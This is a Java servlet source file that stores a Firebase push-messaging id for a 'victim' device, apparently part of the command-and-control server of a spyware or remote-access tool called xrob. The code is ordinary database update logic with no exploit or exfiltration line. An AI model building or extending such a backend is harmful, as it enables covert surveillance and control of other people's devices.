package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.Victims;
import com.theah64.xrob.api.models.Victim;
import com.theah64.xrob.api.utils.APIResponse;
import com.theah64.xrob.api.utils.HeaderSecurity;
import com.theah64.xrob.api.utils.Request;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

/**
 * Created by theapache64 on 12/9/16.
 */
@WebServlet(urlPatterns = {BaseServlet.VERSION_CODE + "/update/fcm"})
public class FCMUpdateServlet extends BaseServlet {

    private final String[] REQUIRED_PARAMS = {Victims.COLUMN_FCM_ID};

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType(CONTENT_TYPE_JSON);

        final PrintWriter out = response.getWriter();

        try {
            HeaderSecurity hs = new HeaderSecurity(request.getHeader(HeaderSecurity.KEY_AUTHORIZATION));
            final Request fcmUpdateRequest = new Request(request, REQUIRED_PARAMS);
            final String fcmId = fcmUpdateRequest.getStringParameter(Victims.COLUMN_FCM_ID);
            final String victimId = hs.getVictimId();

            final boolean isUpdated = Victims.getInstance().update(Victims.COLUMN_ID, victimId, Victims.COLUMN_FCM_ID, fcmId);

            if (isUpdated) {
                out.write(new APIResponse("success", null).getResponse());
            } else {
                throw new RuntimeException("Failed to update the FCM id");
            }

        } catch (Exception e) {
            e.printStackTrace();
            out.write(new APIResponse(e.getMessage()).getResponse());
        }

        out.flush();
        out.close();

    }

}
